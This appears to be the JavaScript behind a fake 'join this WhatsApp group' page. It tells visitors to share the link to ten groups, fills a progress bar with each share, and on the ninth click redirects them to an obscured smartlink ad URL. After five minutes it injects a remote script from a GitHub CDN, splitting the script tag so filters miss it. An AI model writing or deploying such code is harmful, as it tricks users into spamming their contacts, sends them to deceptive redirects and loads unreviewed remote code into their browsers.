// join group
function Join() {
    container.style.display = 'block';
    alert("Share to 10 active Your Whatsapp groups & wait to join this group!");
    start.style.display = 'none';
}

// share group
var clicks = 0;

function Share() {
    clicks += 1;
    if (clicks == 1) {
        document.getElementById('bar').style.width = '20%';
        document.getElementById("bar").innerHTML = "20%";
    }
    if (clicks == 2) {
        document.getElementById('bar').style.width = '30%';
        document.getElementById("bar").innerHTML = "30%";
    }
    if (clicks == 3) {
        document.getElementById('bar').style.width = '40%';
        document.getElementById("bar").innerHTML = "40%";
    }
    if (clicks == 4) {
        document.getElementById('bar').style.width = '50%';
        document.getElementById("bar").innerHTML = "50%";
    }
    if (clicks == 5) {
        document.getElementById('bar').style.width = '60%';
        document.getElementById("bar").innerHTML = "60%";
    }
    if (clicks == 6) {
        document.getElementById('bar').style.width = '70%';
        document.getElementById("bar").innerHTML = "70%";
    }
    if (clicks == 7) {
        document.getElementById('bar').style.width = '80%';
        document.getElementById("bar").innerHTML = "80%";
    }
    if (clicks == 8) {
        document.getElementById('bar').style.width = '90%';
        document.getElementById("bar").innerHTML = "90%";
    }
    if (clicks == 9) {
        setTimeout("window.location.href = 'https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=github&si2=whatsapp';", 0);
    }
};

// time out
setTimeout(function() {
    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
}, 5 * 60 * 1000);
